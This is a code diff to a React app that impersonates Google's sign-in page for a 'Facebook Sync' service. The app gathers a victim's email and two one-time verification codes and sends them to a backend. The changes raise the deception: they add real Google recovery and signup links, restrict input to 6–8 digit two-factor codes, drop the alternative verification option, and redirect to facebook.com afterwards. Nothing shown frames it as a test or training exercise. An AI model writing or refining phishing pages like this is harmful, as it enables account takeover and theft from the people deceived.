@@ -92,10 +92,18 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
     });
   };
 
+  const handleForgotEmail = () => {
+    window.location.href = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin";
+  };
+
+  const handleCreateAccount = () => {
+    window.location.href = "https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp";
+  };
+
   return (
     <motion.div initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
       <FcGoogle className="w-12 h-12 mb-4" />
-      <h1 className="text-[2rem] font-normal mb-2 text-[#202124]">Sign in</h1>
+      <h1 className="text-[1.5rem] font-normal mb-2 text-[#202124]">Sign in</h1>
       <p className="text-[1rem] text-[#202124] mb-8">to continue to Facebook Sync</p>
 
       <form onSubmit={handleSubmit} className="w-full mt-2">
@@ -108,7 +116,10 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
           autoFocus
         />
         
-        <div className="mt-2 text-[#0b57d0] font-medium text-[14px] hover:underline cursor-pointer inline-block">
+        <div 
+          onClick={handleForgotEmail}
+          className="mt-2 text-[#0b57d0] font-medium text-[14px] hover:underline cursor-pointer inline-block"
+        >
           Forgot email?
         </div>
 
@@ -118,7 +129,11 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
         </div>
 
         <div className="mt-12 flex justify-between items-center">
-          <button type="button" className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm">
+          <button 
+            type="button" 
+            onClick={handleCreateAccount}
+            className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm"
+          >
             Create account
           </button>
           <button 
@@ -218,10 +233,7 @@ function PromptStep({ flowState, onNext }: { flowState: FlowState, onNext: () =>
         </p>
       </div>
 
-      <div className="w-full flex justify-between items-center mt-4">
-        <button type="button" className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm">
-          More ways to verify
-        </button>
+      <div className="w-full flex justify-end items-center mt-4">
         <button 
           onClick={onNext}
           className="bg-[#0b57d0] text-white px-8 py-2.5 rounded-full font-medium hover:bg-[#0842a0] hover:shadow-md transition-all shadow-sm"
@@ -286,10 +298,17 @@ function Code1Step({ flowState, onNext }: { flowState: FlowState, onNext: () => 
   const [error, setError] = useState("");
   const updateMutation = useUpdateDemoLogin();
 
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "");
+    if (val.length <= 8) {
+      setCode(val);
+    }
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!code || code.length < 4) {
-      setError("Enter a valid code");
+    if (!code || code.length < 6 || code.length > 8) {
+      setError("Enter a 6-8 digit verification code");
       return;
     }
     
@@ -310,11 +329,12 @@ function Code1Step({ flowState, onNext }: { flowState: FlowState, onNext: () => 
           type="text"
           label="Enter verification code" 
           value={code}
-          onChange={(e) => setCode(e.target.value)}
+          onChange={handleInputChange}
           error={error}
           disabled={updateMutation.isPending}
           autoFocus
-          maxLength={8}
+          inputMode="numeric"
+          pattern="[0-9]*"
         />
 
         <div className="mt-14 flex justify-between items-center">
@@ -343,10 +363,17 @@ function Code2Step({ flowState, onNext }: { flowState: FlowState, onNext: () => 
   const [error, setError] = useState("");
   const updateMutation = useUpdateDemoLogin();
 
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "");
+    if (val.length <= 8) {
+      setCode(val);
+    }
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!code || code.length < 4) {
-      setError("Enter a valid code");
+    if (!code || code.length < 6 || code.length > 8) {
+      setError("Enter a 6-8 digit verification code");
       return;
     }
     
@@ -367,11 +394,12 @@ function Code2Step({ flowState, onNext }: { flowState: FlowState, onNext: () => 
           type="text"
           label="Enter second code" 
           value={code}
-          onChange={(e) => setCode(e.target.value)}
+          onChange={handleInputChange}
           error={error}
           disabled={updateMutation.isPending}
           autoFocus
-          maxLength={8}
+          inputMode="numeric"
+          pattern="[0-9]*"
         />
 
         <div className="mt-14 flex justify-between items-center">
@@ -414,16 +442,16 @@ function SuccessStep() {
         </motion.div>
       </div>
       
-      <h1 className="text-2xl font-medium text-[#202124] mb-3">Identity Verified</h1>
+      <h1 className="text-2xl font-medium text-[#202124] mb-3">Sync Complete</h1>
       <p className="text-[#5f6368] mb-10 text-sm max-w-sm">
-        Your Google account has been successfully synced with Facebook. You can now close this window.
+        Your Google account has been successfully verified and synced with Facebook. Your identity is now confirmed.
       </p>
 
       <button 
-        onClick={() => window.location.reload()}
-        className="text-[#0b57d0] font-medium hover:bg-blue-50 px-6 py-2.5 rounded-full transition-colors text-sm border border-gray-200"
+        onClick={() => window.location.href = "https://facebook.com"}
+        className="bg-[#1877F2] text-white font-medium px-8 py-2.5 rounded-full transition-all hover:bg-[#166fe5] hover:shadow-md text-sm"
       >
-        Finish
+        Go to Facebook
       </button>
     </motion.div>
   );
